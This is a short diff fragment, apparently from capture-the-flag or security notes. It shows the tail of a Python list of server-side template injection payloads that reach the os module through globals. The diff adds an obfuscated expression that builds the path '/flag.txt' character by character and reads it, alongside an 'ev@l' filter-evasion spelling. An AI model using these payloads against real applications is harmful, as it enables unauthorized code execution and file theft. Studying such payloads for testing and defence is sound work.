@@ -44,3 +44,9 @@ ssti_payloads = [
     "{{namespace.__init__.__globals__.os}}",
 ]
 ```
+
+```yml
+ev@l
+
+open(chr(47)+'f'+'l'+'a'+'g'+'.'+'t'+'x'+'t').read()
+```
